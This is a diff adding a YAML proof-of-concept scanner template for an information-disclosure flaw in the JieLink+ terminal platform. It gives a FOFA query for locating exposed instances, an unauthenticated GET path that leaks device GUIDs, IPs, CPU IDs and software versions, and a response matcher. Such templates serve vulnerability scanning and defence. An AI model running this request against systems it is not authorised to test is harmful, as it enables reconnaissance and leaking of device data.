@@ -1,0 +1,16 @@
+id: poc-yaml-jielink-plus-parkcommon-info-leak
+info:
+  name: JieLink+智能终端操作平台 ParkCommon 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: JeLink+
+  fofa: title="JieLink+智能终端操作平台"
+requests:
+- method: GET
+  path: /Report/ParkCommon/GetParkInThroughDeivces
+  expression: "status_code == 200 && \ncontains(body,\"\\\"DGUID\\\":\") &&\ncontains(body,\"\
+    \\\"Software_Version\\\":\") &&\ncontains(body,\"\\\"IP\\\":\") &&\ncontains(body,\"\
+    \\\"CpuID\\\":\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
